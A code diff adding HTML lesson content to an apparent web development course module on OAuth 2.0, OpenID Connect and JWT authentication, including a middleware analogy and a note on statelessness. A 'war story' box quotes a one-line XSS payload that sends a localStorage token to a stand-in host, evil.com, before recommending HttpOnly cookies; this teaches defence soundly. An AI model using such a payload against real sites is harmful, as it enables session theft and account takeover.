@@ -3,6 +3,52 @@ export const day20 = {
   title: "OAuth 2.0 + OpenID Connect (SSO in Real Apps)",
   intro: "Most real products use Google/GitHub login. Today you’ll understand the flow, tokens, and security pitfalls.",
   content: `
+<h3 class="text-xl font-bold text-gray-900 dark:text-white mb-4">0) The "Bouncer" Mental Model (Middleware)</h3>
+<p class="mb-6 text-gray-600 dark:text-light-300">
+Think of your API routes as a VIP Club.
+</p>
+<div class="grid md:grid-cols-2 gap-6 mb-8">
+  <div class="bg-white dark:bg-dark-800 p-5 rounded-xl border border-gray-200 dark:border-dark-600">
+    <h4 class="font-bold text-brand-primary mb-2">The Bouncer (Auth Middleware)</h4>
+    <p class="text-sm text-gray-600 dark:text-light-300">
+      The Bouncer stands at the door. He checks your ID (Token). If it's fake or expired, he kicks you out (401 Unauthorized). He doesn't care what you want to order; he only cares if you are allowed inside.
+    </p>
+  </div>
+  <div class="bg-white dark:bg-dark-800 p-5 rounded-xl border border-gray-200 dark:border-dark-600">
+    <h4 class="font-bold text-purple-600 dark:text-purple-400 mb-2">The Wristband (Session/Token)</h4>
+    <p class="text-sm text-gray-600 dark:text-light-300">
+      Once you pass the bouncer, you get a wristband. You don't show your ID at every table; you just show the wristband. This is how stateless authentication (JWT) works.
+    </p>
+  </div>
+</div>
+
+<div class="mb-8 p-5 rounded-xl border border-purple-500/30 bg-purple-500/5">
+  <h4 class="font-bold text-purple-700 dark:text-purple-300 mb-3 flex items-center gap-2">
+    <span class="text-xl">⚔️</span> War Story: The LocalStorage Heist
+  </h4>
+  <p class="text-sm text-gray-700 dark:text-light-200 mb-4">
+    A crypto startup stored JWTs in <code>localStorage</code>. A hacker found an XSS vulnerability in a 3rd-party chat widget.
+  </p>
+  <p class="text-sm text-gray-700 dark:text-light-200 mb-4">
+    The hacker's script just ran: <code>fetch('evil.com?token=' + localStorage.getItem('token'))</code>.
+    They drained 500 wallets in 10 minutes.
+  </p>
+  <p class="text-xs text-purple-800 dark:text-purple-200 font-bold">
+    Fix: Store tokens in <code>HttpOnly</code> cookies. JavaScript cannot read them, so XSS cannot steal them.
+  </p>
+</div>
+
+<div class="mb-8 p-5 rounded-xl border border-blue-500/30 bg-blue-500/5">
+  <h4 class="font-bold text-blue-700 dark:text-blue-300 mb-3 flex items-center gap-2">
+    <span class="text-xl">🏛️</span> Architect's Note: Statelessness
+  </h4>
+  <p class="text-sm text-gray-700 dark:text-light-200 mb-4">
+    Why do we love JWTs? Because the server doesn't need to remember you.
+    If you have 1 million users and 100 servers, you don't want to sync session data across all 100 servers.
+    The token <strong>is</strong> the session.
+  </p>
+</div>
+
 <h3 class="text-xl font-bold text-gray-900 dark:text-white mb-4">🎯 What You’ll Learn</h3>
 <ul class="list-disc list-inside space-y-2 text-gray-600 dark:text-light-300 mb-6">
   <li>OAuth 2.0 roles: client, resource owner, authorization server, resource server.</li>
